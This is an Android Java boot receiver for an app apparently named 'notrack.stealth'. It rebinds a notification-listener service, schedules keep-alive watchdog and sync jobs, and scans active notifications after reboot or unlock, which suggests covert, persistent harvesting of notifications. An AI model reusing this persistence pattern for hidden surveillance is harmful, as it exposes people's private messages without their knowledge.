package com.notrack.stealth;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.notrack.stealth.sync.SyncWorker;
import com.notrack.stealth.watchdog.WatchdogReceiver;

/**
 * HIGH-RELIABILITY BOOT & RESTART RECEIVER
 * Re-binds NotificationListenerService safely without disabling component,
 * and launches background watchdog.
 */
public class BootReceiver extends BroadcastReceiver {

    private static final String TAG = "StealthBoot";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null || intent.getAction() == null) return;

        String action = intent.getAction();
        Log.i(TAG, "Broadcast received in main process: " + action);

        if (Intent.ACTION_BOOT_COMPLETED.equals(action)
                || Intent.ACTION_MY_PACKAGE_REPLACED.equals(action)
                || Intent.ACTION_USER_PRESENT.equals(action)
                || "android.intent.action.QUICKBOOT_POWERON".equals(action)
                || WatchdogReceiver.ACTION_WATCHDOG_PULSE.equals(action)
                || "com.notrack.stealth.ACTION_CHECK_UPDATE".equals(action)) {

            Log.i(TAG, "Requesting StealthService rebind and scheduling keep-alive watchdog...");

            // 1. Request OS to rebind NotificationListenerService
            StealthService.rebindService(context);

            // 2. Schedule Keep-Alive watchdog & pending sync in main process
            SyncWorker.enqueuePeriodicKeepAlive(context);
            SyncWorker.enqueueSync(context);

            // 3. Instant In-App Auto-Update Check
            com.notrack.stealth.update.UpdateManager.checkForUpdateAsync(context);

            // 4. Scan active notifications if service is bound
            StealthService service = StealthService.getInstance();
            if (service != null) {
                service.processActiveNotifications();
            }
        }
    }
}
